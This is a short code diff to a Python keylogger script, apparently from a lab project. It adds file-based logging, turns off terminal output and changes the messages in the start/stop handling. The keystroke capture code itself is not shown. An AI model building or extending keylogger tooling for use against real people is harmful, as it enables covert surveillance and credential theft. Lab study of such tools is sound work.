@@ -5,6 +5,8 @@ import sys
 import os
 import atexit
 import signal
+import logzero
+from logzero import logger
 
 pidFile = '/tmp/keylog.pid'
 
@@ -21,6 +23,11 @@ def processTerminator(signalNumber,  functionReference):
             return
 
 
+# Add logging to logfile and disable output to the terminal
+logzero.logfile("/home/lab/bin/py/project/k.log", maxBytes=1e6,
+                backupCount=3, disableStderrLogger=True)
+
+
 if len(sys.argv) < 2:
     print('Incorrect Args! Usage: ./a1KeyLogger.py [start | stop]')
     raise SystemExit('Exit Code: ' + str(1))
@@ -28,6 +35,8 @@ if len(sys.argv) < 2:
 # detect start command
 if sys.argv[1] == 'start':
     try:
+        logger.info("Keylogger starting...")
+
         if os.path.exists(pidFile):
             raise RuntimeError('Key logger already running!')
 
@@ -80,7 +89,7 @@ if sys.argv[1] == 'start':
 elif sys.argv[1] == 'stop':
     if os.path.exists(pidFile):
         with open(pidFile) as fileHandler:
-            print("Killing")
+            logger.info("Keylogger finishing...")
             pid = int(fileHandler.readline().rstrip())
             print(pid)
             while True:
